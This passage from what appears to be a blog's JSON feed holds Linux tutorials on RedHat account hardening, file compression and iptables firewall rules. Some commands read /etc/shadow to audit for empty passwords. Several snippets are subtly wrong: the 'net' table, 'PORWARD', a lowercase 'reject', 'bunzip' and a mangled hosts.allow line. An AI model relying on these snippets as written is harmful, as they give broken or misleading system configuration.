<span><span><span>&lt;</span>table</span> <span>tableName</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>domainObjectName</span><span><span>=</span><span>\"</span><span>\"</span></span>\n            <span>enableCountByExample</span><span><span>=</span><span>\"</span>false<span>\"</span></span> <span>enableUpdateByExample</span><span><span>=</span><span>\"</span>false<span>\"</span></span>\n            <span>enableDeleteByExample</span><span><span>=</span><span>\"</span>false<span>\"</span></span> <span>enableSelectByExample</span><span><span>=</span><span>\"</span>false<span>\"</span></span>\n            <span>selectByExampleQueryId</span><span><span>=</span><span>\"</span>false<span>\"</span></span> <span>/></span></span>\n    <span><span><span>&lt;/</span>context</span><span>></span></span>\n<span><span><span>&lt;/</span>generatorConfiguration</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"在-intellij-idea-配置\" tabindex=\"-1\"> 在 IntelliJ IDEA 配置</h3>\n<p>配置命令 <code>mybatis-generator:generate -e</code></p>\n<p><img src=\"/assets/spring-boot-11.png\" alt=\"Spring Boot\"></p>\n<p>配置好之后点击旁边的运行按钮</p>\n<p><img src=\"/assets/spring-boot-12.png\" alt=\"Spring Boot\"></p>\n<p>当然也可以在 plugins 中找到 mybatis-generator, 双击运行或右击运行都可</p>\n<p><img src=\"/assets/spring-boot-13.png\" alt=\"Spring Boot\"></p>\n",
      "image": "https://vxhly.github.io/assets/spring-boot-11.png",
      "date_published": "2018-08-22T16:01:15.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "java"
      ]
    },
    {
      "title": "RedHat 系统安全加固（一）帐号安全",
      "url": "https://vxhly.github.io/views/liunx/account-security.html",
      "id": "https://vxhly.github.io/views/liunx/account-security.html",
      "summary": "前言\n本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。 本篇主要介绍相关于帐号安全的加固策略, 加强系统的防御能力。\n\n",
      "content_html": "<div><p>前言</p>\n<p>本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。 本篇主要介绍相关于帐号安全的加固策略, 加强系统的防御能力。</p>\n</div>\n\n<h2 id=\"密码规则\" tabindex=\"-1\"> 密码规则</h2>\n<h3 id=\"密码长度和有效期\" tabindex=\"-1\"> 密码长度和有效期</h3>\n<p><strong>/etc/login.defs</strong> 文件是当创建用户时的一些规划, 比如创建用户时, 是否需要家目录, UID 和 GID 的范围; 用户的期限等等, 这个文件是可以通过 <code>root</code> 来定义的</p>\n<p><code>Default Configuration:</code></p>\n<div><pre><code>PASS_MAX_DAYS 99999 # 两次改变密码之间相距的最大天数, 密码有效最大天数\nPASS_MIN_DAYS 0 # 两次改变密码之间相距的最小天数, 为零时代表任何时候都可以更改密码\nPASS_MIN_LEN 5 # 密码最小长度\nPASS_WARN_AGE 7 # 在密码过期之前警告的天数\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><div><p>注意</p>\n<p>以上只对之后新增的用户有效, 如果要修改已存在的用户密码规则, 需要使用 <code>chage</code> 命令</p>\n</div>\n<p>使用以下命令, 可以查看用户的密码规则, <code>Command Format:</code></p>\n<div><pre><code>chage -l <span>[</span>userName<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><code>For Examlpe:</code> <br></p>\n<p><img src=\"/assets/redhat-reinforce-1.png\" alt=\"RedHat 系统安全加固\"></p>\n<h2 id=\"chage-命令\" tabindex=\"-1\"> chage 命令</h2>\n<p>设置最大最小使用天数, 以及警告天数, <code>For Examlpe:</code></p>\n<div><pre><code>chage -M <span>90</span> -m <span>6</span> -W <span>30</span> <span>[</span>userName<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>注意</p>\n<p>不要用该命令给 root 用户加上有效期, 如果密码过期, 再加上后文说的 <code>/etc/shadow</code> 文件加锁禁止修改, 会导致 root 提示修改密码, 无法成功修改密码, 从而无法登陆。</p>\n</div>\n<p><code>chage</code> 选项解释</p>\n<ul>\n<li><strong>-m</strong> =&gt; 密码可更改的最小天数。 为零时代表任何时候都可以更改密码。</li>\n<li><strong>-M</strong> =&gt; 密码保持有效的最大天数。</li>\n<li><strong>-w</strong> =&gt; 用户密码到期前, 提前收到警告信息的天数。</li>\n<li><strong>-E</strong> =&gt; 帐号到期的日期。 过了这天, 此帐号将不可用。</li>\n<li><strong>-d</strong> =&gt; 上一次更改的日期。</li>\n<li><strong>-i</strong> =&gt; 停滞时期。 如果一个密码已过期这些天, 那么此帐号将不可用。</li>\n<li><strong>-l</strong> =&gt; 例出当前的设置。 由非特权用户来确定他们的密码或帐号何时过期。</li>\n</ul>\n<p>如果要修改密码过期时间为 <code>“从不”</code> , <code>For Examlpe:</code></p>\n<div><pre><code>chage -M <span>99999</span> <span>[</span>userName<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"空密码检查\" tabindex=\"-1\"> 空密码检查</h2>\n<p><strong>/etc/shadow</strong> 文件中的记录行与 <strong>/etc/passwd</strong> 中的一一对应, 是记录系统中用户的密码的, 此文件只有 <code>root</code> 用户可以对其进行修改</p>\n<p>使用 <code>awk</code> 命令可以检查是否存在空密码, <code>For Examlpe:</code></p>\n<div><pre><code><span>awk</span> -F <span>':'</span> <span>'($2==\"\"){print $1}'</span> /etc/shadow\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"没密码检查\" tabindex=\"-1\"> 没密码检查</h2>\n<p>空密码跟没有密码是俩回事, 体现于 <strong>/etc/shadow</strong> 中的密码那一列, 空密码是显示空, 没有密码是显示 <code>！ ！</code> 使用 <code>awk</code> 命令可以检查是否存在空密码, <code>For Examlpe:</code></p>\n<div><pre><code><span>awk</span> -F <span>':'</span> <span>'($2==\"！ ！ \"){print $1}'</span> /etc/shadow\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"awk-命令\" tabindex=\"-1\"> awk 命令</h2>\n<p>查询 UID 为 0 的用户, <code>For Examlpe:</code></p>\n<div><pre><code><span>awk</span> -F <span>':'</span> <span>'($3==0){print $1}'</span> /etc/passwd\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>提示</p>\n<p>UID 为 0 的任何用户都拥有系统的最高特权, 保证只有 root 用户的 UID 为 0</p>\n</div>\n<p><code>awk</code> 选项解释</p>\n<ul>\n<li><strong><code>-F fs</code></strong> =&gt; fs 指定输入分隔符, fs 可以是字符串或正则表达式, 如 <code>-F:</code></li>\n<li><strong><code>-v var=value</code></strong> =&gt; 赋值一个用户定义变量, 将外部变量传递给 <code>awk</code></li>\n<li><strong><code>-f scripfile</code></strong> =&gt; 从脚本文件中读取 awk 命令</li>\n<li><strong><code>-m[fr] val</code></strong> =&gt; 对 val 值设置内在限制, <code>-mf</code> 选项限制分配给 val 的最大块数目; <code>-mr</code> 选项限制记录的最大数目。 这两个功能是 Bell 实验室版 <code>awk</code> 的扩展功能, 在标准 <code>awk</code> 中不适用。</li>\n</ul>\n<h2 id=\"密码复杂度\" tabindex=\"-1\"> 密码复杂度</h2>\n<p>redhat 公司专门开发了 <code>cracklib</code> 这个安装包来判断密码的复杂度。</p>\n<p>检查是否安装了 <code>cracklib</code> 模块</p>\n<div><pre><code><span>rpm</span> -qa <span>|</span> <span>grep</span> cracklib\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/redhat-reinforce-3.png\" alt=\"RedHat 系统安全加固\"></p>\n<p>在 <code>/etc/pam.d/system-auth</code> 中修改</p>\n<div><pre><code>password requisite pam_cracklib.so try_first_pass retry = 3 difok = 3 minlen = 8 dcredit = -1 ucredit = -1 lcredit = -1 ocredit = -1\npassword sufficient pam_unix.so md5 shadow nullok try_first_pass use_authtok remember = 5\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/redhat-reinforce-4.png\" alt=\"RedHat 系统安全加固\"></p>\n<h3 id=\"参数说明\" tabindex=\"-1\"> 参数说明</h3>\n<ul>\n<li><strong><code>retry=N</code></strong> =&gt; 改变输入密码的次数, 默认值是 1, 一般设置为 3。 就是说, 如果用户输入的密码强度不够可以重复输入的次数。</li>\n<li><strong><code>minlen=N</code></strong> =&gt; 密码最小长度（除了 <code>credit</code> 信用度的字符长度以外）</li>\n<li><strong><code>dcredit=N</code></strong> =&gt; 密码中至少 <code>(N&lt;0)</code> 或至多 <code>(N&gt;=0)</code> 有几个数字</li>\n<li><strong><code>ucredit=N</code></strong> =&gt; 密码中至少 <code>(N&lt;0)</code> 或至多 <code>(N&gt;=0)</code> 有几个大写字母</li>\n<li><strong><code>lcredit=N</code></strong> =&gt; 密码中至少 <code>(N&lt;0)</code> 或至多 <code>(N&gt;=0)</code> 有几个小写字母</li>\n<li><strong><code>ocredit=N</code></strong> =&gt; 密码中至少 <code>(N&lt;0)</code> 或至多 <code>(N&gt;=0)</code> 有几个特殊字符</li>\n<li><strong><code>difok=M</code></strong> =&gt; 新密码与前一个旧密码之间至少有 M 个字符不相同</li>\n</ul>\n<div><p>注意</p>\n<p><code>dcredit</code> 、 <code>ucredit</code> 、 <code>lcredit</code> 、 <code>ocredit</code> 为信用度字符, 如果 <code>N&lt;0</code> , 表示至少, 则新密码长度最小长度就等于 minlen.。 而当 <code>N&gt;0</code> 时, 表示至多, 比如 <code>ocredit=1</code> , 至多有一个特殊字符, 这样的话, 即使没有特殊字符也会允许设置新密码。 还有, 此时新密码长度会大于 minlen。 算法交复杂, 这里不赘述。 因此, 通常情况下推荐使用 <code>N&lt;0</code> 来做密码复杂度限制。 另外, 此密码规则对 root 用户无效, 只针对普通用户修改自身密码</p>\n</div>\n<h2 id=\"登录验证规则\" tabindex=\"-1\"> 登录验证规则</h2>\n<h3 id=\"记录普通用户登录失败次数并锁定用户\" tabindex=\"-1\"> 记录普通用户登录失败次数并锁定用户</h3>\n<p>在 ** <code>/etc/pam.d/system-auth**</code>中<code>&quot;#%PAM-1.0&quot;</code>下面一行加入,<code>For Example:</code></p>\n<div><pre><code>auth required pam_tally2.so deny = 3 unlock_time = 300\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>注意</p>\n<p>一定要加在 <code>#%PAM-1.0</code> 下面一行</p>\n</div>\n<p>参数说明</p>\n<ul>\n<li><strong><code>deny[=n]</code></strong> =&gt; 用户连续错误登陆的最大次数, 超过则锁定</li>\n<li><strong><code>unlock_time</code></strong> =&gt; 设定普通用户锁定后, 多少时间后解锁, 单位是秒</li>\n<li><strong><code>even_deny_root</code></strong> =&gt; 也限制 root 用户</li>\n<li><strong><code>root_unlock_time[=n]</code></strong> =&gt; 设定 root 用户锁定后, 多少时间后解锁, 单位是秒</li>\n<li><strong><code>quiet</code></strong> =&gt; 不对已锁定的用户发出提示信息</li>\n</ul>\n<div><p>注意</p>\n<p>以上参数根据实际需要取舍, 如果使用了 even_deny_root 参数限制 root 用户登录错误次数, 而没有配置 root_unlock_time 的话, 一旦 root 用户被锁, 解锁将很麻烦。</p>\n</div>\n<h3 id=\"查看用户登录失败次数\" tabindex=\"-1\"> 查看用户登录失败次数</h3>\n<p>当登录错误次数达到最大限制后, 用户再次登录时, 会提示</p>\n<div><pre><code>Your account is locked.Maximum amount of failed attempts was reached.\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/redhat-reinforce-6.png\" alt=\"RedHat 系统安全加固\"></p>\n<p>通过以下命令可以查看用户登录失败次数, <code>Command Format:</code></p>\n<div><pre><code>pam_tally2 -u <span>[</span>userName<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><code>For Example:</code> <br></p>\n<p><img src=\"/assets/redhat-reinforce-7.png\" alt=\"RedHat 系统安全加固\"></p>\n<h3 id=\"解锁已经锁定的用户\" tabindex=\"-1\"> 解锁已经锁定的用户</h3>\n<ul>\n<li>自动解锁</li>\n</ul>\n<p>-- 如果配置了 <code>unlock_time</code> 或 <code>root_unlock_time</code> (针对 <code>root</code> 用户)参数, 则等待超过这个时长后, 帐户会自动解锁</p>\n<ul>\n<li>手动解锁:</li>\n</ul>\n<p>-- 只能以 <code>root</code> 用户通过命令 <code>pam_tally2 -u [userName] -r</code> 可以手动解锁因登录错误次数达到最大限制后自动锁定的用户, 同时登录错误次数会被重置为 0</p>\n<h2 id=\"登录超时\" tabindex=\"-1\"> 登录超时</h2>\n<p>对于 bash 用户, 修改 <code>/etc/profile</code> 或 <code>/etc/bashrc</code> , 所有使用 bash 的用户都会继承, <code>For Example:</code> <br></p>\n<p><img src=\"/assets/redhat-reinforce-8.png\" alt=\"RedHat 系统安全加固\"></p>\n<p>对于 csh 用户, 修改 <code>/etc/csh.cshrc</code> , 所有使用 csh 的用户都会继承, <code>For Example:</code> <br></p>\n<p><img src=\"/assets/redhat-reinforce-9.png\" alt=\"RedHat 系统安全加固\"></p>\n<p>对于 bash 用户, 修改 <code>/etc/profile</code> 或 <code>/etc/bashrc</code> , 所有使用 bash 的用户都会继承, <code>For Example:</code> <br></p>\n<p><img src=\"/assets/redhat-reinforce-8.png\" alt=\"RedHat 系统安全加固\"></p>\n<p>对于 csh 用户, 修改 <code>/etc/csh.cshrc</code> , 所有使用 csh 的用户都会继承, <code>For Example:</code> <br></p>\n<p><img src=\"/assets/redhat-reinforce-9.png\" alt=\"RedHat 系统安全加固\"></p>\n<h2 id=\"ssh\" tabindex=\"-1\"> SSH</h2>\n<h3 id=\"禁止-root-用户远程-ssh-登录\" tabindex=\"-1\"> 禁止 root 用户远程 ssh 登录</h3>\n<div><p>提示</p>\n<p>由于之前的笔记已经记录过了, 这里就不再重复了</p>\n</div>\n<h3 id=\"ssh-的黑白名单-指定用户或组\" tabindex=\"-1\"> ssh 的黑白名单（指定用户或组）</h3>\n<div><p>提示</p>\n<p>由于之前的笔记已经记录过了, 这里就不再重复了</p>\n</div>\n<h3 id=\"ssh-的黑白名单-指定-ip\" tabindex=\"-1\"> ssh 的黑白名单（指定 IP）</h3>\n<div><p>提示</p>\n<p>由于之前的笔记已经记录过了, 这里就不再重复了</p>\n</div>\n<h2 id=\"telnet\" tabindex=\"-1\"> Telnet</h2>\n<h3 id=\"禁止-root-用户远程-telnet-登录\" tabindex=\"-1\"> 禁止 root 用户远程 telnet 登录</h3>\n<div><p>提示</p>\n<p>系统安装 <code>telnet-server</code> 服务后, 默认就是禁止 root 用户直接远程 telnet 登录的。 确认只要存在 <code>/etc/securetty</code> 文件, 就可以限制 root 直接远程 telnet 登录。</p>\n</div>\n<h3 id=\"telnet-的黑白名单-指定用户或组\" tabindex=\"-1\"> telnet 的黑白名单（指定用户或组）</h3>\n<p>系统不支持限制普通用户 telnet 远程登录</p>\n<h3 id=\"telnet-的黑白名单-指定-ip\" tabindex=\"-1\"> telnet 的黑白名单（指定 IP）</h3>\n<p>与 <code>SSH</code> 中的相差无几, 同样是在 <code>/etc/hosts.allow</code> 里添加白名单, 在 <code>/etc/hosts.deny</code> 里添加黑名单, <code>For Example:</code></p>\n<div><pre><code>in .telnetd: 192.168 .1 .10 192.168 .1 .11# / etc / hosts.allow in .telnetd: ALL# / etc / hosts.deny\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"禁止普通用户登录-shell\" tabindex=\"-1\"> 禁止普通用户登录 shell</h2>\n<p>使用 <code>usermod</code> 命令修改用户的登录 <code>shell</code> 就好, <code>Command Format:</code></p>\n<div><pre><code><span>usermod</span> -s /sbin/nologin <span>[</span>userName<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"避免普通用户-su-到-root-用户\" tabindex=\"-1\"> 避免普通用户 su 到 root 用户</h2>\n<p>在 ** <code>/etc/pam.d/su**</code>中<code>&quot;#%PAM-1.0&quot;</code> 下面一行加入</p>\n<div><pre><code>auth sufficient pam_rootok.so debug\nauth required pam_wheel.so group = wheel\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/redhat-reinforce-5.png\" alt=\"RedHat 系统安全加固\"></p>\n<p>当然只去除红框中的 <code>#</code> 也是 ok 的<br></p>\n<p><img src=\"/assets/redhat-reinforce-10.png\" alt=\"RedHat 系统安全加固\"></p>\n<p>这样以来只有 wheel 组的用户可以 su 作为 root</p>\n<h2 id=\"指定可以-su-到-root-的用户\" tabindex=\"-1\"> 指定可以 su 到 root 的用户</h2>\n<p>指定某个用户可以 su 到 root 用户, 需要将该用户加入到 wheel 组中</p>\n<div><pre><code><span>usermod</span> -G wheel <span>[</span>username<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>注意</p>\n<p>如果禁止 root 用户直接登录, 也不存在 wheel 组的用户, 就无法进入 root 用户了</p>\n</div>\n<p><img src=\"/assets/redhat-reinforce-11.png\" alt=\"RedHat 系统安全加固\"></p>\n",
      "image": "https://vxhly.github.io/assets/redhat-reinforce-1.png",
      "date_published": "2016-10-14T11:06:38.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "Liunx 学习笔记（三）文件的压缩与解压缩",
      "url": "https://vxhly.github.io/views/liunx/file-compression-and-decompression.html",
      "id": "https://vxhly.github.io/views/liunx/file-compression-and-decompression.html",
      "summary": "前言\n本篇是 Liunx 的学习笔记系列第三篇, 这一篇将介绍在 Liunx 下压缩解压文件或目录常用命令。压缩文件及目录可以大大增加磁盘的利用率。\n\n",
      "content_html": "<div><p>前言</p>\n<p>本篇是 Liunx 的学习笔记系列第三篇, 这一篇将介绍在 Liunx 下压缩解压文件或目录常用命令。压缩文件及目录可以大大增加磁盘的利用率。</p>\n</div>\n\n<h2 id=\"gz-格式\" tabindex=\"-1\"> .gz 格式</h2>\n<div><pre><code><span>gzip</span> <span>[</span>fileName<span>]</span>          <span># 压缩文件</span>\n<span>gzip</span> -d <span>[</span>fileName<span>]</span>.gz    <span># 解压缩文件</span>\ngunzip <span>[</span>fileName<span>]</span>.gz     <span># 解压缩文件</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><div><p>注意</p>\n<p>只能压缩文件而不能压缩目录, 且不保留原文件</p>\n</div>\n<h2 id=\"tar-gz-格式\" tabindex=\"-1\"> .tar.gz 格式</h2>\n<div><pre><code><span>tar</span> -czvf <span>[</span>folderName<span>]</span>.tar.gz <span>[</span>folderName<span>]</span>    <span># 压缩目录或文件</span>\n<span>tar</span> -xzvf <span>[</span>folderName<span>]</span>.tar.gz               <span># 解压目录或文件</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"选项解释\" tabindex=\"-1\"> 选项解释</h3>\n<div><pre><code>-c    <span># 打包</span>\n-x    <span># 解包</span>\n-v    <span># 显示详细信息</span>\n-f    <span># 指定文件名</span>\n-z    <span># 打包同时压缩 / 解压缩</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><div><p>注意</p>\n<p>可以打包或压缩目录和文件, -f 选项是必须的, 且必须放在选项中的最后一位, 可以保留原文件</p>\n</div>\n<h2 id=\"zip-格式\" tabindex=\"-1\"> .zip 格式</h2>\n<div><pre><code><span>zip</span> -r <span>[</span>folderName<span>]</span>.zip <span>[</span>folderName<span>]</span>   <span># 压缩目录</span>\n<span>zip</span> <span>[</span>fileName<span>]</span>.zip <span>[</span>fileName<span>]</span>          <span># 压缩文件</span>\n<span>unzip</span> <span>[</span>fileName<span>]</span>.zip                 <span># 压缩目录或文件</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h3 id=\"选项解释-1\" tabindex=\"-1\"> 选项解释</h3>\n<div><pre><code>-r    压缩目录\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"gz-格式-1\" tabindex=\"-1\"> .gz 格式</h2>\n<div><pre><code><span>gzip</span> <span>[</span>fileName<span>]</span>          <span># 压缩文件</span>\n<span>gzip</span> -d <span>[</span>fileName<span>]</span>.gz    <span># 解压缩文件</span>\ngunzip <span>[</span>fileName<span>]</span>.gz     <span># 解压缩文件</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><div><p>注意</p>\n<p>只能压缩文件而不能压缩目录, 且不保留原文件</p>\n</div>\n<h2 id=\"zip-格式-1\" tabindex=\"-1\"> .zip 格式</h2>\n<div><pre><code><span>zip</span> -r <span>[</span>folderName<span>]</span>.zip <span>[</span>folderName<span>]</span>     <span># 压缩目录</span>\n<span>zip</span> <span>[</span>fileName<span>]</span>.zip <span>[</span>fileName<span>]</span>            <span># 压缩文件</span>\n<span>unzip</span> -uo <span>[</span>fileName<span>]</span>.zip -d <span>[</span>folderName<span>]</span> <span># 解压缩目录或者文件</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p>选项解释</p>\n<div><pre><code>-r    <span># 压缩目录</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>注意</p>\n<p>可以压缩目录或文件, -r 选项用于压缩目录, 可以保留原文件</p>\n</div>\n<h2 id=\"bz2-格式\" tabindex=\"-1\"> .bz2 格式</h2>\n<div><pre><code><span>bzip2</span> -k <span>[</span>fileName<span>]</span>                         <span># 压缩文件且保留原文件</span>\n<span>tar</span> -cjvf <span>[</span>folderName<span>]</span>.tar.bz2 <span>[</span>folderName<span>]</span>   <span># 压缩目录或文###件</span>\nbunzip -k <span>[</span>fileName<span>]</span>.bz2                    <span># 解压缩文件</span>\n<span>tar</span> -xjvf <span>[</span>folderName<span>]</span>.tar.bz2              <span># 解压缩文件</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><p>选项解释</p>\n<div><pre><code>-k      <span># 产生压缩文件后保留原文件</span>\n-j      <span># 格式为 .bz2 的压缩包</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><div><p>注意</p>\n<p>bzip2 命令, 只能压缩文件, 不能压缩目录, 要使原文件保留, 使用 -k 选 项；要压缩目录使用 tar 命令的 -j 选项 用 tar 命令的 -j 选项</p>\n</div>\n",
      "date_published": "2016-09-10T14:04:39.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "RedHat 系统安全加固（五）防火墙 (iptables) 的设置",
      "url": "https://vxhly.github.io/views/liunx/iptables-settings.html",
      "id": "https://vxhly.github.io/views/liunx/iptables-settings.html",
      "summary": "前言\n本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记记录 RedHat 下的防火请的开启和关闭, 还有允许哪些端口通过防火墙。\n\n",
      "content_html": "<div><p>前言</p>\n<p>本系列笔记又是 Liunx 学习系列教程的一大步, 本系列学习笔记记录 RedHat 系统的安全加固。本篇笔记记录 RedHat 下的防火请的开启和关闭, 还有允许哪些端口通过防火墙。</p>\n</div>\n\n<h2 id=\"防火墙的开启和关闭\" tabindex=\"-1\"> 防火墙的开启和关闭</h2>\n<h3 id=\"永久性生效\" tabindex=\"-1\"> 永久性生效</h3>\n<p>使用 <code>chkconfig</code> , 重启后不会复原</p>\n<div><pre><code><span>chkconfig</span> iptables on         <span># 开启</span>\n<span>chkconfig</span> iptables off        <span># 关闭</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h3 id=\"即时生效\" tabindex=\"-1\"> 即时生效</h3>\n<p>使用 <code>service</code> , 重启后复原</p>\n<div><pre><code><span>service</span> iptables start        <span># 开启</span>\n<span>service</span> iptables stop         <span># 关闭</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"iptables-命令解释\" tabindex=\"-1\"> iptables 命令解释</h2>\n<h3 id=\"选项解释\" tabindex=\"-1\"> 选项解释</h3>\n<ul>\n<li><strong>-t&lt;表&gt;</strong>: 指定要操纵的表；</li>\n<li><strong>-A</strong>: 向规则链中添加条目；</li>\n<li><strong>-D</strong>: 从规则链中删除条目；</li>\n<li><strong>-I</strong>: 向规则链中插入条目；</li>\n<li><strong>-R</strong>: 替换规则链中的条目；</li>\n<li><strong>-L</strong>: 显示规则链中已有的条目；</li>\n<li><strong>-F</strong>: 清楚规则链中已有的条目；</li>\n<li><strong>-Z</strong>: 清空规则链中的数据包计算器和字节计数器；</li>\n<li><strong>-N</strong>: 创建新的用户自定义规则链；</li>\n<li><strong>-P</strong>: 定义规则链中的默认目标；</li>\n<li><strong>-h</strong>: 显示帮助信息；</li>\n<li><strong>-p</strong>: 指定要匹配的数据包协议类型；</li>\n<li><strong>-s</strong>: 指定要匹配的数据包源 ip 地址；</li>\n<li><strong>-j&lt;目标&gt;</strong>: 指定要跳转的目标；</li>\n<li><strong>-i&lt;网络接口&gt;</strong>: 指定数据包进入本机的网络接口；</li>\n<li><strong>-o&lt;网络接口&gt;</strong>: 指定数据包要离开本机所使用的网络接口。</li>\n</ul>\n<h3 id=\"命令输入顺序\" tabindex=\"-1\"> 命令输入顺序</h3>\n<div><pre><code>iptables -t 表名 <span>&lt;</span>-A/I/D/R<span>></span> 规则链名 <span>[</span>规则号<span>]</span> <span>&lt;</span>-i/o 网卡名<span>></span> -p 协议名 <span>&lt;</span>-s 源IP/源子网<span>></span> --sport 源端口 <span>&lt;</span>-d 目标IP/目标子网<span>></span> --dport 目标端口 -j 动作\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><ul>\n<li><strong>表名包括</strong></li>\n</ul>\n<p>-- <strong>raw</strong>: 高级功能, 如: 网址过滤。 -- <strong>mangle</strong>: 数据包修改（QOS）, 用于实现服务质量。 -- <strong>net</strong>: 地址转换, 用于网关路由器。 -- <strong>filter</strong>: 包过滤, 用于防火墙规则。</p>\n<ul>\n<li><strong>规则链名包括</strong></li>\n</ul>\n<p>-- <strong>INPUT 链</strong>: 处理输入数据包。 -- <strong>OUTPUT 链</strong>: 处理输出数据包。 -- <strong>PORWARD 链</strong>: 处理转发数据包。 -- <strong>PREROUTING 链</strong>: 用于目标地址转换（DNAT）。 -- <strong>POSTOUTING 链</strong>: 用于源地址转换（SNAT）。</p>\n<ul>\n<li><strong>动作包括</strong></li>\n</ul>\n<p>-- <strong>ACCEPT</strong>: 接收数据包。 -- <strong>DROP</strong>: 丢弃数据包。 -- <strong>REDIRECT</strong>: 重定向、映射、透明代理。 -- <strong>SNAT</strong>: 源地址转换。 -- <strong>DNAT</strong>: 目标地址转换。 -- <strong>MASQUERADE</strong>: IP 伪装（NAT）, 用于 ADSL。 -- <strong>LOG</strong>: 日志记录。</p>\n<h2 id=\"iptables-的设置与查看\" tabindex=\"-1\"> iptables 的设置与查看</h2>\n<h3 id=\"查看-iptables-的设置\" tabindex=\"-1\"> 查看 iptables 的设置</h3>\n<div><pre><code>iptables -nL\n<span>service</span> iptables status\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/iptables-1.png\" alt=\"iptables 的设置与查看\"></p>\n<h3 id=\"清除已有-iptables-规则\" tabindex=\"-1\"> 清除已有 iptables 规则</h3>\n<div><pre><code>iptables -F\niptables -X\niptables -Z\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p><img src=\"/assets/iptables-2.png\" alt=\"iptables 的设置与查看\"></p>\n<h3 id=\"开放指定的端口\" tabindex=\"-1\"> 开放指定的端口</h3>\n<div><pre><code>iptables -A INPUT -s <span>127.0</span>.0.1 -d <span>127.0</span>.0.1 -j ACCEPT\n<span># 允许本地回环接口(即运行本机访问本机)</span>\n\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n<span># 允许已建立的或相关连的通行</span>\n\niptables -A OUTPUT -j ACCEPT\n<span># 允许所有本机向外的访问</span>\n\niptables -A INPUT -p tcp --dport <span>22</span> -j ACCEPT\n<span># 允许访问 22 端口</span>\n\niptables -A INPUT -p tcp --dport <span>80</span> -j ACCEPT\n<span># 允许访问 80 端口</span>\n\niptables -A INPUT -p tcp --dport <span>21</span> -j ACCEPT\n<span># 允许 FTP  服务的 21 端口</span>\n\niptables -A INPUT -p tcp --dport <span>20</span> -j ACCEPT\n<span># 允许 FTP 服务的 20 端口</span>\n\niptables -A INPUT -j reject\n<span># 禁止其他未允许的规则访问</span>\n\niptables -A FORWARD -j REJECT\n<span># 禁止其他未允许的规则访问</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p><code>-A</code> 是在 <code>iptables</code> 的最后添加一条规则, <code>-I</code> 是在 <code>iptables</code> 的前面添加一条规则</p>\n</div>\n<p><img src=\"/assets/iptables-3.png\" alt=\"iptables 的设置与查看\"></p>\n<h3 id=\"屏蔽-ip\" tabindex=\"-1\"> 屏蔽 IP</h3>\n<div><pre><code>iptables -I INPUT -s <span>123.45</span>.6.7 -j DROP\n<span># 屏蔽单个 IP 的命令</span>\n\niptables -I INPUT -s <span>123.0</span>.0.0/8 -j DROP\n<span># 封整个段即从 123.0.0.1 到 123.255.255.254 